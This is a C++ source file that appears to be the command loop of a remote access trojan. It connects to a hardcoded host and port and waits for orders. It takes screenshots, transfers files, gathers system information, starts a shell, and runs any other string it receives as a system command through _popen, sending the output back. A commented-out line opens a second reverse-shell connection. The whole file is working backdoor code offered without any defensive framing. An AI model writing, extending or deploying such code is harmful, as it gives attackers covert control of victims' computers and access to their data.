#pragma once
#include "Command.h"



static SOCKET sClientSocket = StartSocket::Connect(L"192.168.1.7", (short)9000);
static bool bState = true;

Command::Command() {

	while (bState) {
		char cCommand[1024] = { 0 };

		recv(sClientSocket, cCommand, sizeof(cCommand), 0);

		if (strcmp(cCommand, "exit") == 0) {
			bShutDown();
		}
		else if (strcmp(cCommand, "shell") == 0) {
			bShell();
		}
		else if (strcmp(cCommand, "version") == 0) {
			bGetVersion();
		}
		else if (strcmp(cCommand, "screenshot") == 0) {
			bScreenShot();
		}
		else if (strcmp(cCommand, "upload") == 0) {
			bFileUpload();
		}
		else {
			bDefault(cCommand);
		}
	}
}

bool Command::bScreenShot() {

	printf("Command::bScreenShot\n");

	Screenshot::Screenshot(sClientSocket);

	return true;
}

bool Command::bFileUpload() {
	
	FileUpload::FileUpload(sClientSocket);

	return true;
}

bool Command::bShell() {

	//SOCKET sReverseShellSocket = StartSocket::Connect(L"192.168.1.7", (short)9001);

	Shell::Shell();

	return true;
}

bool Command::bGetVersion() {

	GetSystemInfo::GetSystemInfo(sClientSocket);

	return true;
}

bool Command::bDefault(char* command) {

	char output[1024] = { 0 };
	char result[1024] = { 0 };
	FILE* pPipe = NULL;

	if ((pPipe = _popen(command, "r")) == NULL) {
		printf("pPipe failed\n");
	}

	while (fgets(output, sizeof(output), pPipe) != NULL) {
		strcat_s(result, sizeof(result), output);
	}


	send(sClientSocket, result, sizeof(result), 0);
	memset(output, '\0', sizeof(output));
	memset(result, '\0', sizeof(result));
	_pclose(pPipe);

	return true;
}

bool Command::bShutDown() {

	char byemessage[20] = "see ya";

	send(sClientSocket, byemessage, sizeof(byemessage), 0);

	StartSocket::CloseSocket(sClientSocket);

	bState = false;

	return true;
}
